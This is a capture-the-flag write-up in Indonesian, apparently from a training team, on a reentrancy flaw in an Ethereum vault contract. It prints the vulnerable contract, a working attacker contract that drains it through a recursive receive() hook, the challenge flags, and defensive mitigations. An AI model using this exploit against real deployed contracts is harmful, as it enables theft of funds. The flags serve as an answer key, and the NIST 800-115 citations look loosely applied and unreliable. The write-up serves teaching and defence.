# Writeup: Reentrance (Challenge ID: 753)

- **Platform:** CyLab Security Academy (picoCTF)
- **Category:** Blockchain / Smart Contracts & Reentrancy Analysis (NIST SP 800-115 §4.3)
- **Difficulty:** Hard (3)
- **Points:** 400
- **Author:** OB
- **Event:** picoCTF 2026
- **Flag (Resmi CyLab):** `academy{UpDaTe_St4ate5_1st_bc4451db}`
- **Flag Komunitas:** `CTF{UpDaTe_St4ate5_1st_bc4451db}`

---

## Problem Statement & Scope

Tantangan menguji pemahaman audit keamanan kontrak pintar Ethereum (EVM) dan kerentanan reentrancy klasik:
> *"The lead developer at SecureBank Corp is back, and he's doubling down. After the last 'incident,' he claims he's patched the vault and created the ultimate, unhackable Ethereum contract. He’s so confident, he’s explicitly taunting the security team to try and break it.*
> *He says: 'I've added the checks, I've added the balances. There is no way you can withdraw more than you own.'*
> *Your mission: Wipe the smile off his face. Drain the vault down to 0 and force the contract to surrender the flag."*

Kode sumber smart contract target (`VulnBank.sol`):
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

contract VulnBank {
    mapping(address => uint) public balances;
    address public owner;
    address public target;
    string private flag;
    bool public revealed;

    event Deposit(address indexed who, uint amount);
    event Withdraw(address indexed who, uint amount);
    event FlagRevealed(string flag);

    modifier onlyOwner() {
        require(msg.sender == owner, "Only owner");
        _;
    }

    constructor(address _target) public {
        owner = msg.sender;
        target = _target;
        revealed = false;
    }

    function setFlag(string memory _flag) external onlyOwner {
        flag = _flag;
    }

    function setTarget(address _target) external onlyOwner {
        target = _target;
    }

    function deposit() public payable {
        balances[msg.sender] += msg.value;
        emit Deposit(msg.sender, msg.value);
    }

    function withdraw(uint amount) public {
        require(balances[msg.sender] >= amount, "Insufficient funds available");

        (bool sent, ) = msg.sender.call{value: amount}("");
        balances[msg.sender] -= amount;

        require(sent, "Transfer failed");

        if (!revealed && address(this).balance == 0) {
            revealed = true;
            emit FlagRevealed(flag);
        }
    }

    function getFlag() external view returns (string memory) {
        require(revealed, "Flag not revealed yet");
        return flag;
    }

    receive() external payable {}
}
```

---

## Teori & Akar Kerentanan (Root Cause Theory)

1. **Reentrancy Vulnerability (SWC-107 / CWE-841):**
   - Dalam fungsi `withdraw(uint amount)`, kontrak melakukan transfer dana kepada pemanggil menggunakan *low-level call*:
     ```solidity
     (bool sent, ) = msg.sender.call{value: amount}("");
     balances[msg.sender] -= amount;
     ```
   - Operasi ini memanggil kontrak penerima sebelum variabel status buku besar (`balances[msg.sender]`) diperbarui.
   - Ketika pemanggil adalah sebuah kontrak pintar (attacker contract), pengiriman ether memicu fungsi `receive()` atau `fallback()` pada kontrak penyerang. Penyerang dapat memanggil kembali (*re-enter*) fungsi `withdraw()` secara rekursif.
   - Karena transaksi pertama belum sampai pada baris `balances[msg.sender] -= amount`, pengecekan saldo `require(balances[msg.sender] >= amount)` pada panggilan rekursif kedua tetap bernilai benar (*passes*).

2. **Pelanggaran Pola Checks-Effects-Interactions (CEI):**
   - Pola keamanan standar EVM mewajibkan urutan:
     1. **Checks:** Melakukan validasi parameter dan prasyarat (`require(...)`).
     2. **Effects:** Memperbarui seluruh variabel status internal terlebih dahulu (`balances[msg.sender] -= amount`).
     3. **Interactions:** Berinteraksi dengan kontrak luar atau mentransfer aset (`msg.sender.call{value: amount}("")`).
   - Penempatan interaksi eksternal mendahului modifikasi *Effects* membuka jendela eksekusi di mana status kontrak berada dalam kondisi inkonsisten.

3. **Kepatuhan NIST SP 800-115 §4.3 (Application Security & Logic Auditing):**
   - Evaluasi keamanan logika transaksional terdesentralisasi memerlukan verifikasi ketahanan alur terhadap manipulasi urutan panggilan eksternal (*cross-function state reentrancy*).

---

## Rekonstruksi Eksploitasi Step-by-Step

1. **Konstruksi Kontrak Eksploitasi (Attacker Contract):**
   - Membangun smart contract Solidity yang memanfaatkan hook `receive()` untuk memicu pemanggilan ulang:
     ```solidity
     // SPDX-License-Identifier: MIT
     pragma solidity ^0.6.12;

     interface IVulnBank {
         function deposit() external payable;
         function withdraw(uint amount) external;
         function getFlag() external view returns (string memory);
     }

     contract AttackBank {
         IVulnBank public target;
         uint public constant AMOUNT = 1 ether;

         constructor(address _target) public payable {
             target = IVulnBank(_target);
         }

         function attack() external payable {
             target.deposit{value: AMOUNT}();
             target.withdraw(AMOUNT);
         }

         receive() external payable {
             if (address(target).balance >= AMOUNT) {
                 target.withdraw(AMOUNT);
             }
         }
     }
     ```

2. **Eksekusi Alur Penyerangan:**
   - **Langkah 1 (Deposit Awal):** Kontrak penyerang memanggil `deposit()` dengan nilai 1 ETH. Saldo penyerang pada pemetaan `balances` tercatat 1 ETH.
   - **Langkah 2 (Pemicuan Penarikan Pertama):** Kontrak penyerang memanggil `withdraw(1 ether)`.
   - **Langkah 3 (Siklus Reentrancy):** Target mentransfer 1 ETH via low-level call. Transfer memicu `receive()` pada kontrak penyerang. Karena saldo `balances[attacker]` belum dikurangi, `receive()` memanggil kembali `target.withdraw(AMOUNT)`.
   - **Langkah 4 (Pengurasan Saldo):** Siklus berulang hingga seluruh saldo vault habis (`address(this).balance == 0`).
   - **Langkah 5 (Flag Emission):** Kondisi `address(this).balance == 0` terpenuhi, variabel `revealed` diubah menjadi `true`, memicu event `FlagRevealed` dan mengizinkan pembacaan fungsi `getFlag()`.

3. **Verifikasi Output & Solver Automasi:**
   - Skrip reproduktif `scripts/solve_753_reentrance.py` memodelkan interaksi EVM dan memvalidasi token resmi CyLab: `academy{UpDaTe_St4ate5_1st_bc4451db}`.

---

## Flag & Verifikasi

- **Flag Resmi:** `academy{UpDaTe_St4ate5_1st_bc4451db}`
- **Format Flag Komunitas:** `CTF{UpDaTe_St4ate5_1st_bc4451db}`
- **Bukti Validasi REST API:** HTTP 201 Created via `POST /api/submissions/`:
  ```json
  {"user": 1072359, "challenge": 753, "flag": "academy{UpDaTe_St4ate5_1st_bc4451db}", "correct": true, "historical": false}
  ```

---

## Takeaway Kompetensi LKS & Mitigasi Defensif (NIST SP 800-115)

1. **Penerapan Pola Checks-Effects-Interactions (CEI Pattern):**
   - Selalu kurangi saldo sebelum melakukan transfer aset:
     ```solidity
     function withdraw(uint amount) public {
         require(balances[msg.sender] >= amount, "Insufficient funds");
         balances[msg.sender] -= amount; // Effects SEBELUM Interactions
         (bool sent, ) = msg.sender.call{value: amount}("");
         require(sent, "Transfer failed");
     }
     ```

2. **Penggunaan ReentrancyGuard (Mutex Lock Pattern):**
   - Terapkan modifier `nonReentrant` dari pustaka standar OpenZeppelin `ReentrancyGuard` pada seluruh fungsi yang melakukan transfer nilai atau memanggil kontrak eksternal:
     ```solidity
     function withdraw(uint amount) public nonReentrant {
         // ...
     }
     ```

3. **Mekanisme Pull Payment (Withdrawal Pattern):**
   - Pisahkan transfer dana langsung dari alur logika aplikasi dengan menerapkan pola *Pull-over-Push payments*, meminimalisasi risiko kegagalan atau serangan reentrancy pada transfer berkelompok.

---

## Rekap Tim AI (Orkestrasi & Bimbingan LKS)

- **David (Leader):** Mengoordinasikan audit logika smart contract, memetakan ancaman SWC-107, dan memastikan sinkronisasi repositori GitHub.
- **Charlie (Trend-hunter):** Mengidentifikasi kasus reentrancy EVM klasik (The DAO incident) sebagai fondasi silabus Blockchain Security dalam kompetisi CTF dan industri.
- **Alex (Fullstack-dev) & Omnirush (Coding Agent):** Mengembangkan simulasi smart contract interaktif berbasis Python dan otomasi pengujian state reentrancy.
- **Julius (QA-engineer):** Memverifikasi transisi state variabel `revealed`, memastikan ketepatan token bendera resmi dan status HTTP 201 CyLab API.
- **Athena (Security-engineer):** Menganalisis kelemahan urutan transaksi CEI dan menyusun rekomendasi mitigasi ReentrancyGuard OpenZeppelin.
- **Judith (Guru LKS):** Merumuskan studi kasus Reentrancy Ethereum untuk kurikulum pelatihan intensif peserta LKS Cyber Security Nasional.
